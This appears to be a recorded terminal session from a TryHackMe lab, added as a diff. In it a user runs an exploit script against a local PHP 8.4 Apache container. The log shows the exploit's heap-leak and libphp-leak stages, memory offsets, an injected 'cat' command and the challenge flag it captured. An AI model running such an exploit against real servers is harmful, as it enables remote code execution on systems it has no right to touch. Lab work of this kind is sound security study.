@@ -1,0 +1,78 @@
+Script started on 2026-10-23 00:30:56+03:00 [COMMAND="ssh ubuntu@php2shell.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host 'php2shell.thm (10.81.143.45)' can't be established.
+ED25519 key fingerprint is: SHA256:Cb5NcU8EyVmj3jeFi0zc/kuI69SyaYuu3SfBHWpkbcs
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'php2shell.thm' (ED25519) to the list of known hosts.
+ubuntu@php2shell.thm's password: 
+Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 22 21:31:04 UTC 2026
+
+  System load:  0.0                Temperature:           -273.1 C
+  Usage of /:   14.6% of 24.16GB   Processes:             114
+  Memory usage: 17%                Users logged in:       0
+  Swap usage:   0%                 IPv4 address for ens5: 10.81.143.45
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+316 updates can be applied immediately.
+215 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+New release '26.04.1 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Thu Oct 22 21:23:15 2026 from 10.81.124.20
+[?2004h]0;ubuntu@tryhackme-2404: ~[01;32mubuntu@tryhackme-2404[00m:[01;34m~[00m$ ls
+[?2004l[0m[01;34mphp2shell-bypass-aslr-exp[0m
+[?2004h]0;ubuntu@tryhackme-2404: ~[01;32mubuntu@tryhackme-2404[00m:[01;34m~[00m$ cd 
+.cache/                    .local/                    .ssh/                      php2shell-bypass-aslr-exp/
+]0;ubuntu@tryhackme-2404: ~[01;32mubuntu@tryhackme-2404[00m:[01;34m~[00m$ cd php2shell-bypass-aslr-exp/
+[?2004l[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ ls
+[?2004lASLR_PATHS.md               DISPLAY_ERRORS_OFF.md  NOTES.md              README.md  [0m[01;32mexploit.py[0m  [01;34mout[0m           [01;34mtools[0m
+ASLR_PURE_HTTP.md           HTTP_HEAP_LEAK.md      NOTES_BG.md           [01;34mdocker[0m     [01;34mlab[0m         readme_en.md
+ASLR_PURE_HTTP_RESEARCH.md  NOASLR_REPORT.md       NO_DISPLAY_ERRORS.md  e.py       [01;34mlogs[0m        [01;34msrc[0m
+[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ [7mpython3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/ou[27m[7mt[27m[7m/p1' --proof-file out/p1[27m[A]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mdocker ps --format '{{.Names}}  {{.Image}}  {{.Status}}'[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cdocker ps --format '{{.Names}}  {{.Image}}  {{.Status}}'
+[?2004lphp2shell-target  php:8.4.26-apache  Up 8 minutes
+[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ [7mdocker exec php2shell-target php -v[27mdocker exec php2shell-target php -v
+[?2004lPHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
+Copyright (c) The PHP Group
+Built by https://github.com/docker-library/php
+Zend Engine v4.4.26, Copyright (c) Zend Technologies
+    with Zend OPcache v8.4.26, Copyright (c), by Zend Technologies
+[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ [7mcurl -s http://127.0.0.1:8088/index.php[27mcurl -s http://127.0.0.1:8088/index.php
+[?2004lOK
+[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ [7mpython3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/ou[27m[7mt[27m[7m/p1' --proof-file out/p1[27m[A]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ python3 exploit.py -u http://127.0.0.1:8088/index.php -c 'cat /f>/out/p1' --proof-file out/p1
+[?2004l[*] target http://127.0.0.1:8088/index.php (cmd='cat /f>/out/p1')
+[*] offsets loaded from /home/ubuntu/php2shell-bypass-aslr-exp/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7393ea600000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7393ec201000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7393ea6690d8 ZIF=0x7393ec666370
+[+] W3 attempt 1
+PROOF: THM{b4ilout_l3aves_th3_h3ap_dang1ing}
+[?2004h]0;ubuntu@tryhackme-2404: ~/php2shell-bypass-aslr-exp[01;32mubuntu@tryhackme-2404[00m:[01;34m~/php2shell-bypass-aslr-exp[00m$ Read from remote host php2shell.thm: Connection reset by peer
+Connection to php2shell.thm closed.
+client_loop: send disconnect: Broken pipe
+
+Script done on 2026-10-23 00:46:11+03:00 [COMMAND_EXIT_CODE="255"]
